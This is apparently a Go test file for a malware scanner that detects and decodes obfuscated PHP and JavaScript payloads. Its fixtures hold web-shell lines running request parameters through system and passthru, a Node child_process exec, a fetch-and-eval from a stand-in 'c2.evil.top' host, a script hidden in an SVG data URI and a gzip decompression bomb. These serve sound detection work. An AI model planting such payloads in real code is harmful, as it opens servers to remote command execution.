// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"compress/zlib"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand/v2"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/RhythmShahriar/sightread/core"
)

func randomBytes(n int, seed uint64) []byte {
	r := rand.New(rand.NewPCG(seed, seed^0x9e3779b97f4a7c15))
	b := make([]byte, n)
	for i := range b {
		b[i] = byte(r.UintN(256))
	}
	return b
}

func testEnv() decodeEnv { return decodeEnv{budget: newDecodeBudget(), layers: maxLayers} }

func b64(b []byte) string { return base64.StdEncoding.EncodeToString(b) }

func deflateRaw(b []byte) []byte {
	var buf bytes.Buffer
	w, _ := flate.NewWriter(&buf, flate.BestCompression)
	_, _ = w.Write(b)
	_ = w.Close()
	return buf.Bytes()
}

func gzipBytes(b []byte) []byte {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, _ = w.Write(b)
	_ = w.Close()
	return buf.Bytes()
}

func zlibBytes(b []byte) []byte {
	var buf bytes.Buffer
	w := zlib.NewWriter(&buf)
	_, _ = w.Write(b)
	_ = w.Close()
	return buf.Bytes()
}

func blobOf(fs []core.Feature) (core.Feature, bool) {
	for _, f := range fs {
		if f.Kind == core.FBlob {
			return f, true
		}
	}
	return core.Feature{}, false
}

func TestBlobDetection(t *testing.T) {
	rnd := randomBytes(600, 1)
	escaped := ""
	for _, c := range randomBytes(200, 2) {
		escaped += fmt.Sprintf(`\x%02x`, c)
	}
	var codes []string
	for _, c := range []byte(strings.Repeat("console.log('hello world');", 8)) {
		codes = append(codes, strconv.Itoa(int(c)))
	}
	half := b64(rnd)
	tests := []struct {
		name, path, src string
		attrs           map[string]string // nil: no FBlob
	}{
		{"base64", "x.php", `<?php $p = '` + b64(rnd) + `';`, map[string]string{"encoding": "base64", "decoded": "data", "layers": "1"}},
		{"hex", "x.php", `<?php $p = '` + hex.EncodeToString(rnd[:300]) + `';`, map[string]string{"encoding": "hex", "decoded": "data"}},
		{"escape chain", "x.php", `<?php $p = "` + escaped + `";`, map[string]string{"encoding": "escape", "size": strconv.Itoa(len(escaped) + 2)}},
		{"char codes", "x.js", `var s = String.fromCharCode(` + strings.Join(codes, ",") + `);`, map[string]string{"encoding": "charcodes", "decoded": "code"}},
		{"char code array", "x.js", `var a = [` + strings.Join(codes, ", ") + `];`, map[string]string{"encoding": "charcodes"}},
		{"concatenation", "x.php", `<?php $p = '` + half[:400] + `' . '` + half[400:] + `';`, map[string]string{"encoding": "base64", "size": strconv.Itoa(len(half) + 4)}},
		{"plain text", "x.php", `<?php $t = '` + strings.Repeat("This plugin adds a form to your site. ", 20) + `';`, nil},
		{"short base64", "x.php", `<?php $p = '` + b64(rnd[:300]) + `';`, nil},
		{"sql", "x.php", `<?php $q = "` + strings.Repeat("SELECT ID, post_title FROM wp_posts WHERE post_status = 'publish' ", 10) + `";`, nil},
		{"long identifier list", "x.js", `var k = '` + strings.Repeat("abcdefghijklmnopqrstuvwxyz", 30) + `';`, nil},
		{"data uri in code", "x.js", `const icon = 'data:image/png;base64,` + b64(rnd) + `';`, map[string]string{"encoding": "data-uri", "mime": "image/png", "decoded": "data"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			l := langPHP
			if strings.HasSuffix(tc.path, ".js") {
				l = langJS
			}
			fs := codeFeatures(l, tc.path, []byte(tc.src), core.CtxCode)
			f, ok := blobOf(fs)
			if tc.attrs == nil {
				if ok {
					t.Fatalf("unexpected blob %s %v", f.Key, f.Attrs)
				}
				return
			}
			if !ok {
				t.Fatalf("no blob in %q", describe(fs))
			}
			for k, v := range tc.attrs {
				if f.Attrs[k] != v {
					t.Errorf("attr %s = %q, want %q (all %v)", k, f.Attrs[k], v, f.Attrs)
				}
			}
			wantCtx := core.CtxCode
			if tc.attrs["encoding"] == encDataURI {
				wantCtx = ctxAsset
			}
			if f.Context != wantCtx {
				t.Errorf("context %q, want %q", f.Context, wantCtx)
			}
		})
	}
}

func TestBlobEntropy(t *testing.T) {
	random := b64(randomBytes(900, 3))
	fs := phpFeatures(`<?php $p = '` + random + `';`)
	f, ok := blobOf(fs)
	if !ok {
		t.Fatal("no blob")
	}
	if e, _ := strconv.ParseFloat(f.Attrs["entropy"], 64); e < 5.5 || e > 6.01 {
		t.Errorf("entropy of random base64 %v, want about 6", e)
	}
	if e := entropy([]byte(strings.Repeat("a", 100))); e != 0 {
		t.Errorf("entropy of one letter %v", e)
	}
	if e := entropy([]byte("abcd")); e != 2 {
		t.Errorf("entropy of four letters %v", e)
	}
}

// hasDecoded reports whether fs holds a feature of kind and key in
// Context decoded.
func hasDecoded(fs []core.Feature, kind core.FeatureKind, key string) bool {
	for _, f := range fs {
		if f.Kind == kind && f.Key == key && f.Context == core.CtxDecoded {
			return true
		}
	}
	return false
}

func TestDecodedPayloads(t *testing.T) {
	php := []byte(`system($_GET['c']);`)
	js := []byte(`require('child_process').exec(process.env.CMD);`)
	inner := `eval(base64_decode('` + b64([]byte(`passthru($_POST['x']);`)) + `'));`
	long := []byte(`$u = 'https://c2.evil.top/x'; $c = file_get_contents($u); eval($c); // ` + strings.Repeat("padding ", 80))
	tests := []struct {
		name, path, src string
		kind            core.FeatureKind
		key             string
	}{
		{"gzinflate base64", "x.php", `<?php eval(gzinflate(base64_decode('` + b64(deflateRaw(php)) + `')));`, core.FFlow, "request->exec"},
		{"call in payload", "x.php", `<?php eval(gzinflate(base64_decode('` + b64(deflateRaw(php)) + `')));`, core.FCall, "system"},
		{"rot13 chain", "x.php", `<?php eval(gzuncompress(base64_decode(str_rot13('` + rot13(b64(zlibBytes(php))) + `'))));`, core.FCall, "system"},
		{"strrev chain", "x.php", `<?php eval(base64_decode(strrev('` + reverse(b64(php)) + `')));`, core.FCall, "system"},
		{"gzdecode", "x.php", `<?php eval(gzdecode(base64_decode('` + b64(gzipBytes(php)) + `')));`, core.FCall, "system"},
		{"hex2bin", "x.php", `<?php eval(hex2bin('` + hex.EncodeToString(php) + `'));`, core.FCall, "system"},
		{"nested payload", "x.php", `<?php eval(gzinflate(base64_decode('` + b64(deflateRaw([]byte(inner))) + `')));`, core.FCall, "passthru"},
		{"variable blob", "x.php", `<?php $p = '` + b64(long) + `'; eval(base64_decode($p));`, core.FDomain, "evil.top"},
		{"js atob", "x.js", `eval(atob('` + b64(js) + `'));`, core.FCall, "child_process.exec"},
		{"js buffer", "x.js", `eval(Buffer.from('` + b64(js) + `', 'base64').toString());`, core.FFlow, "env->exec"},
		{"js escapes", "x.js", `var s = "` + escapeAll(append(js, " // "+strings.Repeat("pad", 40)...)) + `"; eval(s);`, core.FCall, "child_process.exec"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			l := langPHP
			if strings.HasSuffix(tc.path, ".js") {
				l = langJS
			}
			fs, un := analyzeCode(l, tc.path, []byte(tc.src), core.CtxCode, decodeEnv{budget: newDecodeBudget(), layers: maxLayers})
			if len(un) > 0 {
				t.Errorf("unanalysed %v", un)
			}
			if !hasDecoded(fs, tc.kind, tc.key) {
				t.Errorf("no decoded %s:%s in %q", tc.kind, tc.key, describeCtx(fs))
			}
			for _, f := range fs {
				if f.Context == core.CtxDecoded && f.Ev.Line != 1 {
					t.Errorf("%s at line %d, want the blob's line 1", f.SetKey(), f.Ev.Line)
				}
			}
		})
	}
}

func escapeAll(b []byte) string {
	var s strings.Builder
	for _, c := range b {
		fmt.Fprintf(&s, `\x%02x`, c)
	}
	return s.String()
}

func TestDecodedNegatives(t *testing.T) {
	tests := []struct{ name, path, src string }{
		{"decoded text is data", "x.php", `<?php echo base64_decode('` + b64([]byte("Thank you for installing our plugin. Visit the settings page.")) + `');`},
		{"decoded binary", "x.php", `<?php $img = base64_decode('` + b64(randomBytes(700, 9)) + `');`},
		{"comment payload", "x.php", `<?php // eval(base64_decode('` + b64([]byte(`system($_GET['c']);`)) + `'));`},
	}
	for _, tc := range tests {
		for _, f := range phpFeatures(tc.src) {
			if f.Context == core.CtxDecoded {
				t.Errorf("%s: decoded feature %s", tc.name, f.SetKey())
			}
		}
	}
}

func TestDecodeBomb(t *testing.T) {
	// Each member is 16 MiB of zeros; 64 members are one gzip stream of
	// 1 GiB. Wrapped in gzip once more and base64, it is a few KiB of
	// PHP (T-4).
	member := gzipBytes(make([]byte, 16<<20))
	inner := bytes.Repeat(member, 64)
	src := `<?php eval(gzdecode(gzdecode(base64_decode('` + b64(gzipBytes(inner)) + `'))));`
	start := time.Now()
	budget := newDecodeBudget()
	fs, un := analyzeCode(langPHP, "bomb.php", []byte(src), core.CtxCode, decodeEnv{budget: budget, layers: maxLayers})
	if len(un) != 1 || un[0].Reason != reasonDecodeLimit || un[0].Path != "bomb.php" {
		t.Errorf("unanalysed %v, want decode limit reached", un)
	}
	if d := time.Since(start); d > 5*time.Second*raceSlowdown {
		t.Errorf("took %v", d)
	}
	if left := budget.left.Load(); left < -1 {
		t.Errorf("budget left %d", left)
	}
	if !matchFeature(fs, core.FEval, "eval", map[string]string{"decode": "true"}) {
		t.Errorf("the eval itself is lost: %q", describe(fs))
	}
}

func TestDecodeLayersLimit(t *testing.T) {
	payload := []byte(`system($_GET['c']);`)
	for range 10 {
		payload = []byte(b64(payload))
	}
	src := `<?php eval(base64_decode('` + string(payload) + `'));`
	_, un := analyzeCode(langPHP, "deep.php", []byte(src), core.CtxCode, decodeEnv{budget: newDecodeBudget(), layers: maxLayers})
	if len(un) != 1 || un[0].Reason != reasonDecodeLimit {
		t.Errorf("unanalysed %v, want decode limit reached after %d layers", un, maxLayers)
	}
}

func TestPackageDecodeBudget(t *testing.T) {
	b := newDecodeBudget()
	b.left.Store(100)
	if _, _, err := decodeAll([]byte(b64(randomBytes(200, 4))), []string{"base64_decode"}, maxLayers, b); err == nil {
		t.Error("decoded past the package budget")
	}
	if b.take(1) {
		t.Error("budget not spent")
	}
}

func TestAssetDataURIs(t *testing.T) {
	font := b64(append([]byte("wOF2"), randomBytes(800, 5)...))
	script := b64([]byte(`require('child_process').exec(process.env.X); // ` + strings.Repeat("x", 600)))
	css := "@font-face {\n  font-family: X;\n  src: url(data:font/woff2;base64," + font + ") format('woff2');\n}\n"
	fs, un := assetFeatures("assets/style.css", []byte(css), testEnv())
	if len(un) != 0 || len(fs) != 1 || fs[0].Kind != core.FBlob || fs[0].Context != ctxAsset || fs[0].Attrs["decoded"] != decodedData || fs[0].Ev.Line != 3 {
		t.Errorf("font data URI: %+v %v", fs, un)
	}
	svg := `<svg xmlns="http://www.w3.org/2000/svg"><script href="data:text/javascript;base64,` + script + `"/></svg>`
	fs, _ = assetFeatures("icon.svg", []byte(svg), testEnv())
	if !hasDecoded(fs, core.FCall, "child_process.exec") {
		t.Errorf("script data URI not analysed: %q", describeCtx(fs))
	}
	if f, ok := blobOf(fs); !ok || f.Attrs["decoded"] != decodedCode {
		t.Errorf("script data URI blob %+v", f)
	}
	fs, _ = assetFeatures("small.css", []byte("a{background:url(data:image/gif;base64,R0lGODlhAQABAAAAACw=)}"), testEnv())
	if len(fs) != 0 {
		t.Errorf("a tiny data URI is a blob: %q", describe(fs))
	}
}

func FuzzDecode(f *testing.F) {
	ops := []string{"base64_decode", "gzinflate", "gzuncompress", "gzdecode", "str_rot13", "hex2bin", "strrev", "atob"}
	f.Add([]byte(b64(deflateRaw([]byte("system($x);")))), uint32(0x21))
	f.Add(gzipBytes([]byte("hello")), uint32(3))
	f.Add([]byte(hex.EncodeToString(zlibBytes([]byte("abc")))), uint32(0x25))
	f.Add([]byte("not encoded at all"), uint32(0))
	f.Fuzz(func(t *testing.T, data []byte, sel uint32) {
		var chain []string
		for i := 0; i < 4; i++ {
			k := (sel >> (4 * i)) & 0xf
			if k == 0 {
				break
			}
			chain = append(chain, ops[int(k-1)%len(ops)])
		}
		b := newDecodeBudget()
		out, layers, _ := decodeAll(data, chain, maxLayers, b)
		if len(out) > max(len(data), maxBlobOut) {
			t.Errorf("output %d bytes past the cap", len(out))
		}
		if layers > maxLayers {
			t.Errorf("%d layers", layers)
		}
		if left := b.left.Load(); left < -1 || left > maxPackageOut {
			t.Errorf("budget left %d", left)
		}
	})
}
